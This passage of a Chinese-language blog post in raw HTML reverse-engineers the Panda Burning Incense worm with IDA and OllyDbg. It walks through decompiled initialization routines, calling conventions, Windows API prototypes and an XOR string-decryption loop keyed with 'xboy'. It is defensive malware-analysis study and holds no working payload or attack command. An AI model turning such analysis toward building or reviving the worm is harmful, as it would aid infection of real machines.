[SP+8]，说明<code>retaddr[]</code>共占8个字节，里面的两个元素很有可能也是int类型。</p><p>第17行代码的<code>sub_4049E8()</code>函数如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __usercall sub_4049E8@&lt;eax&gt;(<span class="type">int</span> a1@&lt;eax&gt;, <span class="type">int</span> a2@&lt;ebp&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// ebx@1</span></span><br><span class="line">  HMODULE v3; <span class="comment">// eax@1</span></span><br><span class="line"></span><br><span class="line">  v2 = a1;</span><br><span class="line">  TlsIndex = <span class="number">0</span>;</span><br><span class="line">  v3 = GetModuleHandleA(<span class="number">0</span>);</span><br><span class="line">  dword_40E650 = (<span class="type">int</span>)v3;</span><br><span class="line">  dword_40D0B8 = (<span class="type">int</span>)v3;</span><br><span class="line">  dword_40D0BC = <span class="number">0</span>;</span><br><span class="line">  dword_40D0C0 = <span class="number">0</span>;</span><br><span class="line">  sub_4049DC();</span><br><span class="line">  <span class="keyword">return</span> sub_403980(v2, (<span class="type">int</span>)&amp;unk_40D0B4, a2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>__usercall</code>表示用户自定义函数调用约定，用户可以显式指定参数和返回值的位置。比如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __usercall sub_4049E8@&lt;eax&gt;(<span class="type">int</span> a1@&lt;eax&gt;, <span class="type">int</span> a2@&lt;ebp&gt;)</span><br></pre></td></tr></table></figure><p>表示函数有两个参数：第一个参数通过eax寄存器传递，第二个参数通过ebp寄存器传递，返回值保存在eax寄存器中。</p><p>用户自定义函数调用约定的一般规则如下：</p><ul><li><p>返回值必须位于寄存器中</p></li><li><p>如果返回值类型是void，不能指定返回值的位置</p></li><li><p>如果参数的位置没有指定，假设参数通过堆栈传递</p></li><li><p>可以允许嵌套声明，如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> **__usercall func16@&lt;eax&gt;(<span class="type">int</span> *(__usercall *x)@&lt;ebx&gt; (<span class="type">int</span>, <span class="type">long</span>@&lt;ecx&gt;, <span class="type">int</span>)@&lt;esi&gt;);</span><br></pre></td></tr></table></figure></li><li><p>用于指定位置名的寄存器必须在当前处理器中有效</p></li><li><p>寄存器对可以像这样 \<edx:eax\> 用冒号的形式指定</p></li><li><p><strong>由调用者清理堆栈</strong></p></li></ul><p>该函数的第8行代码有一个API函数，原型为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HMODULE <span class="title function_">GetModuleHandleA</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in, optional] LPCSTR lpModuleName</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>功能是加载模块的名称（.dll或.exe文件）。如果省略了文件名扩展名，则将附加默认库扩展名.dll。文件名字符串可以包括一个尾点字符（.），以指示模块名称没有扩展名。字符串不必指定路径。指定路径时，请确保使用反斜线（\），而不是正斜线（/）。将名称（大小写独立）与当前映射到调用过程地址空间的模块的名称进行比较。</p><p>如果<code>lpModuleName</code>参数为null，则<code>GetModuleHandle()</code>将返回用于创建调用过程（.exe文件）的文件的句柄。</p><p>如果函数成功，则返回值是指定模块的句柄。如果函数失败，则返回值为null。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dword_40E650 = (<span class="type">int</span>)v3;</span><br><span class="line">dword_40D0B8 = (<span class="type">int</span>)v3;</span><br><span class="line">dword_40D0BC = <span class="number">0</span>;</span><br><span class="line">dword_40D0C0 = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>这些是写入数据段的操作，暂时可以不管。</p><p>再看<code>sub_4049DC()</code>函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">_DWORD *<span class="title function_">sub_4049DC</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> sub_4046F0(&amp;unk_40D0B4);<span class="comment">//将40D0B4这个地址作为参数传入</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">_DWORD *__usercall sub_4046F0@&lt;eax&gt;(_DWORD *result@&lt;eax&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  *result = dword_40D028;<span class="comment">//在40D0B4地址中存入40D028地址的数据</span></span><br><span class="line">  dword_40D028 = (<span class="type">int</span>)result;<span class="comment">//在40D028地址中存入40D0B4这个地址</span></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数的功能是把地址40D0B4作为媒介，使得40D028能通过40D0B4找回自己原本存的值。</p><p><code>sub_403980()</code>函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __usercall sub_403980@&lt;eax&gt;(<span class="type">int</span> a1@&lt;eax&gt;, <span class="type">int</span> a2@&lt;edx&gt;, <span class="type">int</span> a3@&lt;ebp&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  dword_40E010 = (<span class="type">int</span>)RaiseException;</span><br><span class="line">  dword_40E014 = (<span class="type">int</span> (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD))RtlUnwind;</span><br><span class="line">  dword_40E628 = a1;</span><br><span class="line">  dword_40E62C = <span class="number">0</span>;</span><br><span class="line">  dword_40E630 = a2;</span><br><span class="line">  dword_40E01C = *(_DWORD *)(a2 + <span class="number">4</span>);</span><br><span class="line">  sub_403878(a3);</span><br><span class="line">  byte_40E024 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> sub_403920();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>RaiseException()</code>是用来抛出一个调用线程时发生的异常。</p><p><code>RtlUnwind()</code>遍历访问异常帧链表，把从表头帧到目标帧（不含）的所有异常处理回调函数用异常码（STATUS_UNWIND 即0C0000027H）、异常标志（EXCEPTION_UNWINDING即值2）调用。</p><p>下面等等那些函数基本不用看了(我累了)，因为我们发现一整个<code>sub_4049E8()</code>函数只是在进行初始化操作。一般入口第一个函数就是做初始化操作的。</p><p>回到主函数的<code>__readfsdword()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> __readfsdword( </span><br><span class="line">   <span class="type">unsigned</span> <span class="type">long</span> Offset</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>参数：从最初读取的 FS 的偏移量。</p><p>返回值：字节、字、双字或多次字长的内存内容 (如指示名为调用的函数) 在位置 FS:[Offset]。</p><p><code>__writefsdword()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __writefsdword( </span><br><span class="line">   <span class="type">unsigned</span> <span class="type">long</span> Offset, <span class="comment">//从最初 FS 的偏移量写入</span></span><br><span class="line">   <span class="type">unsigned</span> <span class="type">long</span> Data <span class="comment">//要写入的值</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><h2 id="5-1-sub-403C98函数分析"><a href="#5-1-sub-403C98函数分析" class="headerlink" title="5.1 sub_403C98函数分析"></a>5.1 sub_403C98函数分析</h2><p>主函数调用了两次<code>sub_403C98()</code>，那先来看它传入的参数是什么类型的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sub_403C98((<span class="keyword">volatile</span> <span class="type">signed</span> __int32 *)&amp;dword_40E7D4, (<span class="type">signed</span> __int32)dword_40CC40);</span><br><span class="line">sub_403C98((<span class="keyword">volatile</span> <span class="type">signed</span> __int32 *)&amp;unk_40E7D8, (<span class="type">signed</span> __int32)dword_40CC6C);</span><br></pre></td></tr></table></figure><p><code>volatile</code>关键字的作用是：编译器在用到这个关键字修饰的变量时必须每次都重新读取这个变量的值，而不是使用保存在寄存器里的备份。</p><p>第一个参数是整数指针类型，在BSS段；第二个参数是整型，移到它上面能看到它是一个整型数组，在CODE段。</p><p>BSS（Block Started by Symbol）通常是指用来存放程序中未初始化的全局变量和静态变量的一块内存区域。特点是可读可写，在程序执行之前BSS段会自动清0。所以，未初始的全局变量在程序执行之前已经成0了。</p><p>CODE段，代码段又称文本段，用来存放指令，运行代码的一块内存空间，此空间大小在代码运行前就已经确定，内存空间一般属于只读，某些架构的代码也允许可写。在代码段中，也有可能包含一些只读的常数变量，例如字符串常量等。</p><p>点进<code>sub_403C98()</code>查看函数调用约定，用的<code>__usercall</code>修饰，第一个参数存入eax，第二参数存入edx，返回值存入eax。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">volatile</span> <span class="type">signed</span> __int32 *__usercall sub_403C98@&lt;eax&gt;(<span class="keyword">volatile</span> <span class="type">signed</span> __int32 *result@&lt;eax&gt;, <span class="type">signed</span> __int32 a2@&lt;edx&gt;)</span><br></pre></td></tr></table></figure><p>现在看第一个<code>sub_403C98()</code>，<code>&amp;dword_40E7D4</code>表示将地址40E7D4存入eax，<code>dword_40CC40</code>表示将地址40CC40的内容存入edx。那么地址40CC40中的内容是什么呢？需要用OD进行调试。</p><img src="/posts/a48809a5/5.1.5.png" class="" title="查看地址40CC40的内容"><p>可以看到“武汉男生感染下载者”等等一些内容，这就是病毒作者的信息。早些年病毒作者出于炫耀目的，都会加入一些自己的特征。同样，现在APT攻击溯源也会通过文件路径等获取病毒作者的信息。</p><p>接下来进入这个函数分析，看IDA真的折磨，先把几个系统调用的东西看懂了。</p><img src="/posts/a48809a5/5.1.6.png" class="" title="sub_403C98()函数分析"><p><code>__OFADD__</code>是一个宏，它的作用是测试两个数相加是否溢出，返回溢出标志位；<code>__OFSUB__</code>同理。</p><p><code>_InterLockedIncrement()</code>、<code>_InterLockedDecrement()</code>的功能是实现数的原子性加减。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> _InterlockedIncrement(</span><br><span class="line">   <span class="type">long</span> <span class="keyword">volatile</span> * lpAddend<span class="comment">//[in，out]指向要递增的变量的指针,返回值是生成的递增值</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="type">long</span> _InterlockedDecrement(</span><br><span class="line">   <span class="type">long</span> <span class="keyword">volatile</span> * lpAddend<span class="comment">//[in， out]指向要减数的变量的易失指针,返回值是生成的递减值</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><code>_InterlockedExchange()</code>函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> _InterlockedExchange(</span><br><span class="line">   <span class="type">long</span> <span class="keyword">volatile</span> * Target,</span><br><span class="line">   <span class="type">long</span> Value</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>相关参数：</p><ul><li>Target：[in，out]指向要交换的值的指针。 此函数会将此变量设置为<code>Value</code>并返回其之前的值。</li><li>Value：[in]要与指向的值交换的值<code>Target</code>。</li></ul><p>返回值：返回由<code>Target</code>指向的初始值。</p><p>为了观察<code>sub_403C98()</code>函数的执行过程，最好结合IDA和OD一步步调试。<code>sub_403C98()</code>中有三个函数：</p><ol><li><code>sub_403D08()</code></li><li><code>sub_402650()</code></li><li><code>sub_402540()</code></li></ol><h3 id="5-1-1-sub-403D08"><a href="#5-1-1-sub-403D08" class="headerlink" title="5.1.1 sub_403D08"></a>5.1.1 sub_403D08</h3><p>将eax和edx入栈，进入函数<code>sub_403D08()</code>。</p><img src="/posts/a48809a5/5.1.7.png" class="" title="sub_403C98()函数分析"><img src="/posts/a48809a5/5.1.8.png" class="" title="sub_403D08()函数分析"><p><code>sub_403D08()</code>中有一个函数，进入函数<code>sub_402520()</code>。<code>sub_402520()</code>中有两个函数：<code>sub_401F4C()</code>和<code>sub_402608()</code>。</p><img src="/posts/a48809a5/5.1.9.png" class="" title="sub_402520()函数分析"><p>进入<code>sub_401F4C()</code>，再进入<code>sub_401860()</code>。</p><img src="/posts/a48809a5/5.1.10.png" class="" title="sub_401F4C()函数分析"><p><code>sub_401860()</code>中，有几个API函数：</p><img src="/posts/a48809a5/5.1.11.png" class="" title="sub_401860()函数分析"><img src="/posts/a48809a5/5.1.12.png" class="" title="sub_401860()函数分析"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">VOID <span class="title function_">InitializeCriticalSection</span><span class="params">(<span class="comment">//初始化一个临界资源对象</span></span></span><br><span class="line"><span class="params">    LPCRITICAL_SECTION lpCriticalSection <span class="comment">//临界资源对象指针</span></span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"></span><br><span class="line">VOID <span class="title function_">EnterCriticalSection</span><span class="params">(<span class="comment">//进入临界区</span></span></span><br><span class="line"><span class="params">    __inout LPCRITICAL_SECTION lpCriticalSection</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"></span><br><span class="line">VOID <span class="title function_">LeaveCriticalSection</span><span class="params">( <span class="comment">//离开临界区</span></span></span><br><span class="line"><span class="params">    _Inout_LPCRITICAL_SECTION lpCriticalSection</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"></span><br><span class="line">HLOCAL <span class="title function_">LocalAlloc</span><span class="params">(<span class="comment">//堆中分配指定大小的字节数</span></span></span><br><span class="line"><span class="params">    UINT uFlags,</span></span><br><span class="line"><span class="params">    UINT uBytes</span></span><br><span class="line"><span class="params">)</span>;<span class="comment">//返回值：成功则返回一个指向新分配的内存对象的句柄。</span></span><br></pre></td></tr></table></figure><p>相关的多线程数据操作函数有：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">InitializeCriticalSection(&amp;cs);<span class="comment">//初始化临界区</span></span><br><span class="line">EnterCriticalSection(&amp;cs);<span class="comment">//进入临界区</span></span><br><span class="line"><span class="comment">//操作数据</span></span><br><span class="line">MyMoney*=<span class="number">10</span>;<span class="comment">//所有访问MyMoney变量的程序都需要这样写Enter.. Leave...</span></span><br><span class="line">LeaveCriticalSection(&amp;cs);<span class="comment">//离开临界区</span></span><br><span class="line">DeleteCriticalSection(&amp;cs);<span class="comment">//删除临界区</span></span><br></pre></td></tr></table></figure><p>由于临界资源做的是原子操作，不可能人为把它们分开，所以<code>sub_401860()</code>可以不用管，这个函数只是分配一定大小的内存空间而已。</p><p>回到<code>sub_401F4C()</code>，发现又有<code>EnterCriticalSection()</code>和<code>LeaveCriticalSection()</code>，通常它们都是成对出现的，它们之间进行的是原子操作，所以<code>sub_401F4C()</code>也可以不看了。</p><img src="/posts/a48809a5/5.1.13.png" class="" title="sub_401F4C()函数分析"><img src="/posts/a48809a5/5.1.14.png" class="" title="sub_401F4C()函数分析"><p>回到<code>sub_402520()</code>，在执行的过程跳过了<code>sub_402608()</code>函数，可以先在call指令处下个断点，等下次如果运行到这里时可以知道经过了这个函数。</p><img src="/posts/a48809a5/5.1.15.png" class="" title="sub_402520()函数分析"><p>由于<code>sub_403D08()</code>中只有<code>sub_402520()</code>，而<code>sub_402520()</code>也没有其它函数了，所以<code>sub_403D08()</code>基本可以排除它的嫌疑了，它的功能就是分配一定大小的内存空间。</p><h3 id="5-1-2-sub-402650"><a href="#5-1-2-sub-402650" class="headerlink" title="5.1.2 sub_402650"></a>5.1.2 sub_402650</h3><p>在IDA中可以看到<code>sub_402650()</code>的功能是字符串拷贝。</p><img src="/posts/a48809a5/5.1.16.png" class="" title="sub_402650()函数分析"><img src="/posts/a48809a5/5.1.17.png" class="" title="sub_402650()函数分析"><p><code>sub_402540()</code>这个函数被跳过了，先不管。</p><h3 id="5-1-3-总结"><a href="#5-1-3-总结" class="headerlink" title="5.1.3 总结"></a>5.1.3 总结</h3><p>根据上面的分析，可以暂时发现<code>sub_403C98()</code>这个函数有两个功能：</p><ul><li>分配一定大小的内存空间</li><li>将字符串拷贝到分配好的内存空间去</li></ul><p>第二个<code>sub_403C98()</code>显示的字符串是“感谢艾玛…”，也可以帮我们收集病毒制作者的信息。</p><img src="/posts/a48809a5/5.1.18.png" class="" title="sub_403C98()函数分析"><p>为了易于观察，可以在IDA中将<code>sub_403C98()</code>命名为<code>AllocStackAndCopyString()</code>，便于我们理解及分析整个病毒。</p><h2 id="5-2-sub-405360函数分析"><a href="#5-2-sub-405360函数分析" class="headerlink" title="5.2 sub_405360函数分析"></a>5.2 sub_405360函数分析</h2><p>主函数也调用两次<code>sub_405360()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sub_405360((<span class="type">int</span>)dword_40CCA4, (<span class="type">int</span>)<span class="string">&quot;xboy&quot;</span>, (<span class="keyword">volatile</span> <span class="type">signed</span> __int32 *)&amp;v9);</span><br><span class="line">sub_405360((<span class="type">int</span>)dword_40CCE0, (<span class="type">int</span>)<span class="string">&quot;whboy&quot;</span>, (<span class="keyword">volatile</span> <span class="type">signed</span> __int32 *)&amp;v8);</span><br></pre></td></tr></table></figure><p>第一个参数是整型数组，位于CODE段；第二个参数是字符数组，位于CODE段；第三个是整型指针变量，点进去可以看到它的基本信息。</p><img src="/posts/a48809a5/5.2.1.png" class="" title="参数分析"><p>进去<code>sub_405360()</code>查看它的函数调用约定：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __usercall sub_405360@&lt;eax&gt;(<span class="type">int</span> a1@&lt;eax&gt;, <span class="type">int</span> a2@&lt;edx&gt;, <span class="keyword">volatile</span> <span class="type">signed</span> __int32 *a3@&lt;ecx&gt;)</span><br></pre></td></tr></table></figure><p>是用户自定义函数调用，第一个参数存入eax，第二个参数存入edx，第三个参数存入ecx，返回值存入eax。</p><p>跟<code>sub_403C98()</code>一样步骤，查看几个参数的值，再进去分析这个函数做了什么。</p><img src="/posts/a48809a5/5.2.2.png" class="" title="sub_405360()函数分析"><img src="/posts/a48809a5/5.2.3.png" class="" title="sub_405360()函数分析"><h3 id="5-2-1-sub-403ECC"><a href="#5-2-1-sub-403ECC" class="headerlink" title="5.2.1 sub_403ECC"></a>5.2.1 sub_403ECC</h3><p>根据分析，<code>sub_403ECC()</code>前面的call都是进行初始化寄存器的操作，可以不管。</p><img src="/posts/a48809a5/5.2.4.png" class="" title="sub_405360()函数分析"><p>进入到<code>sub_403ECC()</code>后，eax的值从字符串变为0x20。</p><img src="/posts/a48809a5/5.2.5.png" class="" title="sub_403ECC()函数分析"><p>想弄清楚这个0x20是怎么来的，结果发现样本载入OD时数据窗口就已经存有了0x20。再仔细看数据窗口，结合“xboy”前4个字节的值是4，不难猜测那一串字符的前4个字节的值0x20是字符串的长度。所以这个函数勉强可以算为求字符串的长度，将它更名为<code>StringLen()</code>。</p><p>其实，凡是由Delphi编写的程序，它会在字符串-4的位置保存这个字符串的长度。</p><h3 id="5-2-2-进入循环"><a href="#5-2-2-进入循环" class="headerlink" title="5.2.2 进入循环"></a>5.2.2 进入循环</h3><p>这里面有几个陌生的指令，先学习一下。</p><p>cdq：使用eax的最高位扩展edx的所有位，将eax扩展为64位，edx:eax</p><p>div：无符号除法，被除数为eax，结果的商存放在eax中，余数存放在edx中</p><p>idiv：有符号除法，在32位系统中进行64 / 32位除法，即被除数为64位，除数为32位。结果的商存放在eax中，余数存放在edx中</p><p>movzx：一般用于将较小值拷贝到较大值中</p><img src="/posts/a48809a5/5.2.6.png" class="" title="循环分析"><p>第一次循环运行到<code>sub_403E2C()</code>后，分析如下：</p><img src="/posts/a48809a5/5.2.7.png" class="" title="循环分析"><h4 id="5-2-2-1-sub-403E2C"><a href="#5-2-2-1-sub-403E2C" class="headerlink" title="5.2.2.1 sub_403E2C"></a>5.2.2.1 sub_403E2C</h4><p>进入<code>sub_403E2C()</code>后发现有<code>sub_403D34()</code>函数。</p><img src="/posts/a48809a5/5.2.8.png" class="" title="sub_403E2C()函数分析"><p>再进去，发现这几个函数我们上面都有分析过，总体来说是进行字符串拷贝操作，所以将<code>sub_403D34()</code>命名为<code>StringCopy()</code>。</p><img src="/posts/a48809a5/5.2.9.png" class="" title="sub_403D34()函数分析"><p>返回到父函数，继续看下一个。</p><h4 id="5-2-2-2-sub-403ED4"><a href="#5-2-2-2-sub-403ED4" class="headerlink" title="5.2.2.2 sub_403ED4"></a>5.2.2.2 sub_403ED4</h4><p>在<code>sub_403ED4()</code>中，有一个跳转实现了，去到<code>sub_403C98()</code>，这不就是我们上面分析的主函数的第一个函数吗，它的作用是分配内存空间和字符串拷贝。</p><img src="/posts/a48809a5/5.2.10.png" class="" title="sub_403ED4()函数分析"><p>此时，eax的值为<code>0x13FF80</code>，edx的值为<code>0xB10068</code>，执行<code>sub_403C98()</code>的意思是将地址B10068拷贝到地址13FF80中去。</p><img src="/posts/a48809a5/5.2.11.png" class="" title="sub_403ED4()函数分析"><img src="/posts/a48809a5/5.2.12.png" class="" title="sub_403ED4()函数分析"><p>跳转未实现，需要进入<code>sub_4041FC()</code>函数进行分析。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __usercall sub_4041FC@&lt;eax&gt;(<span class="type">char</span> **a1@&lt;eax&gt;, <span class="type">int</span> a2@&lt;edx&gt;, <span class="type">int</span> a3@&lt;ecx&gt;)</span><br></pre></td></tr></table></figure><p>eax中存的内容是ecx的值的地址。进去发现有4个子函数：<code>sub_402560()</code>、<code>sub_403D08()</code>、<code>sub_402650()</code>、<code>sub_403C44()</code>。后面三个前面已经分析过了，分别是分配一定大小的内存空间、字符串拷贝、初始化寄存器。</p><p>现在看<code>sub_402560()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_DWORD *__usercall sub_402560@&lt;eax&gt;(_DWORD *result@&lt;eax&gt;, <span class="type">int</span> a2@&lt;edx&gt;)</span><br></pre></td></tr></table></figure><img src="/posts/a48809a5/5.2.13.png" class="" title="sub_402560()函数分析"><p>进去里面发现又是对临界资源的操作，可以不管，回到父函数<code>sub_403ED4()</code>。</p><p>下面这个call又调用了<code>sub_402650()</code>字符串拷贝函数。</p><img src="/posts/a48809a5/5.2.14.png" class="" title="sub_403ED4()函数分析"><p>在循环处下多几个断点，查看在循环的过程中地址B10068附近数据的变化。</p><img src="/posts/a48809a5/5.2.15.png" class="" title="循环分析"><p>发现在地址40CC94的那一串字符与“xboy”异或后变成“武汉男生感染下载者”，存在了地址B10088中。</p><h3 id="5-2-3-sub-403C98"><a href="#5-2-3-sub-403C98" class="headerlink" title="5.2.3 sub_403C98"></a>5.2.3 sub_403C98</h3><p>是5.1分析过的函数，不再赘述。</p><h3 id="5-2-4-sub-403C68"><a href="#5-2-4-sub-403C68" class="headerlink" title="5.2.4 sub_403C68"></a>5.2.4 sub_403C68</h3><p>也是进行了一些原子操作，不用管。</p><h3 id="5-2-5-总结"><a href="#5-2-5-总结" class="headerlink" title="5.2.5 总结"></a>5.2.5 总结</h3><p>这个函数最主要部分就是循环，“xboy”与那奇怪的字符串异或后变成“武汉男生感染下载者”，说明进行了解密，不妨将<code>sub_405360()</code>函数更名为<code>DecodeString()</code>。</p><h2 id="5-3-sub-404018函数分析"><a href="#5-3-sub-404018函数分析" class="headerlink" title="5.3 sub_404018函数分析"></a>5.3 sub_404018函数分析</h2><p>这个函数也是用户自定义调用约定，第一个参数存入eax，第二个参数存入edx，返回值存入eax。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __usercall sub_404018@&lt;eax&gt;(<span class="type">int</span> result@&lt;eax&gt;, <span class="type">int</span> a2@&lt;edx&gt;)</span><br></pre></td></tr></table></figure><img src="/posts/a48809a5/5.3.1.png" class="" title="sub_404018()函数分析"><img src="/posts/a48809a5/5.3.2.png" class="" title="sub_404018()函数分析"><p>结合来看，不难猜测这个函数的功能是字符串比较。将该函数更名为<code>CMPString()</code>。</p><p>至此，病毒的初始化全过程已经进入尾声了。不得不说，分析样本真的好累啊，分析了两天才分析完样本的初始化。接下来分析紧接着的三个函数是熊猫烧香病毒最重要的功能。</p><h1 id="6-动静结合分析样本——病毒释放机理"><a href="#6-动静结合分析样本——病毒释放机理" class="headerlink" title="6. 动静结合分析样本——病毒释放机理"></a>6. 动静结合分析样本——病毒释放机理</h1><p>继续看主函数的<code>sub_408024()</code>、<code>sub_40CA5C()</code>、<code>sub_40C97C()</code>，这三个是熊猫烧香的核心函数。</p><h2 id="6-1-sub-408024函数分析"><a href="#6-1-sub-408024函数分析" class="headerlink" title="6.1 sub_408024函数分析"></a>6.1 sub_408024函数分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __thiscall <span class="title function_">sub_408024</span><span class="params">(<span class="type">void</span> *this)</span></span><br></pre></td></tr></table></figure><p><code>__thiscall</code>的主要特征是：</p><ul><li>由被调用者清除堆栈</li><li>参数从右往左依次入栈</li><li>this指针通过ECX传递，而不是用栈</li></ul><p>在这个函数中，有非常多的子函数，接下来逐一分析。</p><h3 id="6-1-1-sub-40277C"><a href="#6-1-1-sub-40277C" class="headerlink" title="6.1.1 sub_40277C"></a>6.1.1 sub_40277C</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __usercall sub_40277C@&lt;eax&gt;(<span class="type">int</span> a1@&lt;eax&gt;, _DWORD *a2@&lt;edx&gt;)</span><br></pre></td></tr></table></figure><img src="/posts/a48809a5/6.1.1.png" class="" title="sub_40277C()函数分析"><img src="/posts/a48809a5/6.1.2.png" class="" title="sub_40277C()函数分析"><p><code>sub_40277C()</code>函数中有两个API函数：<code>GetModuleFileName()</code>和<code>GetCommandLine()</code>。</p><p><code>GetModuleFileName()</code>的功能是获取当前进程已加载模块的文件的完整路径，该模块必须由当前进程加载。如果想要获取另一个已加载模块的文件路径，可以使用<code>GetModuleFileNameEx()</code>函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DWORD WINAPI <span class="title function_">GetModuleFileName</span><span class="params">(</span></span><br><span class="line"><span class="params">    _In_opt_  HMODULE hModule,</span></span><br><span class="line"><span class="params">    _Out_     LPTSTR lpFilename,</span></span><br><span class="line"><span class="params">    _In_      DWORD nSize</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>参数：</p><ul><li>hModule：Long类型，一个模块的句柄。可以是一个DLL模块，或者是一个应用程序的实例句柄。如果该参数为NULL，该函数返回该应用程序全路径。</li><li>lpFileName：String类型，指定一个字串缓冲区，要在其中容纳文件的用NULL字符中止的路径名，<code>hModule</code>模块就是从这个文件装载进来的。</li><li>nSize：Long类型，装载到缓冲区<code>lpFileName</code>的最大字符数量。</li></ul><p>返回值：Long，如执行成功，返回复制到<code>lpFileName</code>的实际字符数量；零表示失败。使用<code>GetLastError()</code>可以打印错误信息。</p><p><code>GetCommandLine()</code>的功能是获得指向当前命令行缓冲区的一个指针。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LPTSTR <span class="title function_">GetCommandLine</span><span class="params">(<span 